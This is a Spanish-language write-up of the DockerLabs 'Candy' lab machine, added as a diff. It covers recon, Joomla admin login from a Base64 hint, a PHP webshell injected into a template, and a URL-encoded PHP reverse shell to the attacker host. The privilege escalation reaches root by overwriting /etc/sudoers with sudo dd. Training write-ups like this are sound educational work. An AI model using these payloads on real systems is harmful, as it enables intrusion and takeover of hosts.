@@ -1,0 +1,256 @@
+---
+title: Candy
+description: Resolución completa de la máquina virtual *Candy* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Candy**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un sitio web basado en Joomla que contiene pistas codificadas en Base64 en archivos accesibles. Estas pistas revelan credenciales que permiten acceder al panel de administración de Joomla, donde se sube una webshell para obtener ejecución remota de comandos como `www-data`.
+Tras obtener una reverse shell, se identifica un archivo de respaldo que contiene credenciales del usuario `luisillo`, permitiendo el acceso SSH. Finalmente, se abusa del binario `dd` con permisos sudo para modificar `/etc/sudoers` y escalar privilegios a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Candy',
+    Autor: 'Luisillo_o',
+    Dificultad: 'Fácil',
+    Fecha: '29/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Candy.zip
+sudo bash auto_deplo.sh Candy.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Candy/{content,exploits,nmap,scripts}
+cd Candy
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1751146544/Ports_yrw6eo.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1751146542/Gobuster_wvfntp.png)
+
+**Hallazgos relevantes:**
+- `index.html` — Página principal tipo blog, actualmente sin artículos.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1751146543/Index_hnc7xy.png)
+- `README.txt` y `LICENSE.txt` — Archivos por defecto de Joomla.
+- `robots.txt` — Contiene directorios y una pista relevante.
+  ![Robots](https://res.cloudinary.com/dewqswzke/image/upload/v1751146546/Robots_ogd9ez.png)
+- `un_caramelo` — Archivo adicional que repite la pista encontrada en `robots.txt`.
+  ![Caramelo](https://res.cloudinary.com/dewqswzke/image/upload/v1751146548/UnCaramelo_g5a9d1.png)
+- `administrator` — Panel de administración de Joomla.
+  ![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1751146541/Administrator_byvndl.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Decodificación de pista
+
+Una de las pistas clave aparece como una cadena codificada en Base64. Se decodifica:
+
+```bash
+echo "c2FubHVpczEyMzQ1" | base64 -d
+```
+
+![Base64](https://res.cloudinary.com/dewqswzke/image/upload/v1751146541/Base64_amvftt.png)
+
+Esto proporciona una posible contraseña para iniciar sesión en el panel de administración.
+
+### 2.2 Acceso al panel de administración de Joomla
+
+Se accede al panel de administración con las credenciales obtenidas:
+
+![Admin login](https://res.cloudinary.com/dewqswzke/image/upload/v1751146540/Admin_zu2rcq.png)
+
+### 2.3 Subida de webshell
+
+En la sección de *Templates*, se edita el `index.php` del tema activo y se agrega una webshell:
+
+```php
+system($_GET['shadow']);
+```
+
+![Webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1751146546/Shadow_awmyre.png)
+
+### 2.4 Reverse Shell
+
+Se comprueba la ejecución remota:
+
+```
+http://172.17.0.2/index.php?shadow=id
+```
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -lvnp 443
+```
+
+Se envía el payload a través del parámetro `shadow`:
+
+```bash
+curl "http://172.17.0.2/index.php?shadow=php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.1%22%2C443%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27"
+```
+
+![Reverse Shell](https://res.cloudinary.com/dewqswzke/image/upload/v1751146545/ReverseShell_qnxyuf.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → luisillo
+
+Con `www-data`, se buscan archivos del usuario `luisillo`:
+
+```bash
+find / -user luisillo 2>/dev/null
+```
+
+![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1751146541/Find_dscrps.png)
+
+Uno de los archivos accesibles es:
+
+```
+/var/backups/hidden/otrro_caramelo.txt
+```
+
+Este contiene credenciales en texto plano:
+
+![Caramelo](https://res.cloudinary.com/dewqswzke/image/upload/v1751146541/Caramelo_qzvnyl.png)
+
+Con estas credenciales, se accede vía SSH como `luisillo`:
+
+```bash
+ssh luisillo@172.17.0.2
+```
+
+### 3.2 De luisillo → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1751146547/Sudo-l_hlhyjm.png)
+
+El usuario puede ejecutar `dd` como root sin contraseña.
+
+Se utiliza `dd` para modificar `/etc/sudoers` y otorgar privilegios a `luisillo`:
+
+```bash
+echo 'luisillo ALL=(ALL) NOPASSWD:ALL' | sudo dd of=/etc/sudoers
+```
+
+![Escalada](https://res.cloudinary.com/dewqswzke/image/upload/v1751146541/Escalade_shkzkx.png)
+
+Luego, se escala a superusuario:
+
+```bash
+sudo su
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1751146546/Sudo_exxw2q.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Exposición de pistas codificadas en archivos públicos",
+      severity: "Media",
+      impact: "Revelación de credenciales de acceso al panel de administración"
+    },
+    {
+      vulnerability: "Credenciales por defecto o débiles en Joomla",
+      severity: "Alta",
+      impact: "Acceso no autorizado al panel de administración"
+    },
+    {
+      vulnerability: "Subida de archivos no restringida en Joomla",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Credenciales en texto plano en archivos de respaldo",
+      severity: "Crítica",
+      impact: "Compromiso de acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en dd",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante modificación de archivos del sistema"
+    }
+  ]}
+/>
